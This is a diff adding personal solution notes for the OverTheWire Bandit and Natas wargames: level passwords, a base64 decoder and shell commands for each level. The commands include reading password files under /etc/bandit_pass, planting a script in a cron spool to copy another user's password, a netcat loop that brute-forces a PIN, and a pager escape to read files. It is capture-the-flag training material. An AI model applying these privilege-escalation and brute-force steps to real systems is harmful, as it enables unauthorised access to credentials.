@@ -1,7 +1,21 @@
 '''
 bandit.labs.overthewire.org
 0 bandit0
+1 boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+2 CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+3 UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+4 pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+5 koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+6 DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+7 HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+8 cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+9 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+10 truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+11 IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
 12 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+13 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+15 BfMYroe26WYalil77FoDi9qh59eK5xNr
 16 cluFn7wTiGryunymYOu4RcffSxQluehd
 18 kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
 19 IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
@@ -23,14 +37,107 @@ http://natas0.natas.labs.overthewire.org
 1 gtVrDuiDfck831PqWsLEZy5gyDz1clto
 2 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 '''
-
+import base64
 import codecs
 import libchall as lc
 import string
 
+'''
+bandit0 cat readme
+bandit1 cat ./-
+bandit2 cat spaces\ in\ this\ filename
+bandit3 cat inhere/.hidden
+bandit4 cat ./inhere/-file0*
+bandit5 find ./ -type f -size 1033c | xargs cat
+bandit6 find / -type f -readable -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat
+bandit7 cat data.txt | grep millionth
+bandit8 cat data.txt | sort | uniq -c | egrep '^\s+1\s'
+bandit9 strings data.txt  | grep '=='
+'''
+
+def bandit10():
+    print base64.b64decode('VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==')
+
 def bandit11():
     T = '5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh'
     print codecs.encode(T, 'rot_13')
+
+'''
+bandit12
+    cd `mktemp -d`
+    cp ~/data.txt .
+    cat data.txt # clearly a hex dump of a file
+   xxd -r data.txt > dump
+   file dump
+   mv dump dump.gz
+   gzip -d dump.gz
+   file dump
+   bzip2 -d dump
+   file dump.out
+   mv dump.out dump.out.gz
+   gzip -d dump.out.gz
+   file dump.out
+   mv dump.out dump.out.tar
+   tar xvf dump.out.tar
+   file data5.bin
+   tar xvf data5.bin
+   file xvf data6.bin
+   bzip2 -d data6.bin
+   file data6.bin.out
+   tar xvf data6.bin.out
+   file data8.bin
+   mv data8.bin data8.bin.gz
+   gzip -d data8.bin.gz
+   file data8.bin
+   cat data8.bin
+bandit13 ssh -i sshkey.private bandit14@localhost
+bandit14 telnet localhost 30000
+bandit15 echo 'BfMYroe26WYalil77FoDi9qh59eK5xNr' | openssl s_client -quiet -connect localhost:30001
+bandit16
+    PORTS=`netstat -tnlp | egrep '3[12][0-9]{3}' | tr ':' ' ' | awk '{print $5}'`
+    for i in $PORTS; do echo 'cluFn7wTiGryunymYOu4RcffSxQluehd' | timeout 3 openssl s_client -quiet -connect localhost:$i; done;
+    cd `mktemp -d`
+    echo ' * paste private key *' > bandit17.key'
+    chmod 600 bandit.key
+bandit17 diff passwords.old passwords.new
+bandit18 ssh bandit18@localhost -- cat readme
+bandit19 ./bandit20-do cat /etc/bandit_pass/bandit20
+bandit20
+    session one = while true; do    echo -e "GbKksEFF4yrVs6il55v6gwY5aVje5f0j"| nc -l -p 1337 -q 1; done
+    session two = ./suconnect 1337
+bandit21
+    cat /etc/cron.d/cronjob_bandit22
+    cat /usr/bin/cronjob_bandit22.sh
+    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit22
+    cat /usr/bin/cronjob_bandit23.sh
+    myname=bandit23
+    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+    echo /tmp/$mytarget
+bandit23
+  cd `mktemp -d`
+  vim gimme.sh
+    #!/bin/sh
+    cat  /etc/bandit_pass/bandit24 > /tmp/tmp.jRqTAgAW4q/bandit24
+    chmod 666 /tmp/tmp.jRqTAgAW4q/bandit24
+  chmod 777 gimme.sh
+  cp gimme.sh /var/spool/bandit24/
+  # just wait until bandit24 pops up in your directory
+bandit24
+    cd `mktemp -d`
+    vim connect.sh
+        #!/bin/sh
+        echo $1
+        (echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $1" | nc localhost 30002) >> output
+    chmod +x connect.sh
+    for i in $(seq -f "%04g" 9999); do echo $i >> numbers; done;
+    cat numbers | xargs -n 1 -P 30 ./connect.sh
+    cat output | sort | uniq
+bandit26
+    cat /etc/passwd | grep bandit26
+    make your terminal smaller than the message you get when logging into bandit26
+    this causes more not to exit immediately, press "v" and then :r /etc/bandit_pass/bandit26
+'''
 
 def krypton2():
     T = 'OMQEMDUEQMEK'
@@ -61,4 +168,4 @@ def krypton3():
         print ' '.join(i)
     # doubles UU VV
 
-krypton3()
+bandit10()
